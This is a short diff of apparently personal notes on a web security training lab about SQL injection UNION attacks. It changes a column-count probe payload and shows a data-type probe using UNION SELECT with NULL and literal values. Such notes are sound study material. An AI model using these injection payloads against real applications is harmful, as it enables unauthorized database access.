@@ -132,7 +132,7 @@ Lab7: SQL injection UNION attack, determining the number of columns returned by 
 
 
       -fIND THE NO. OF COLUMNS 
-      'UNION SELECT NULL,NULL,NULL,NULL --+
+      'UNION SELECT NULL,NULL,NULL --+
 
       -FIND THE DATA TYPE OF COLUMNS
       'UNION SELECT NULL,'ABC',113 --+
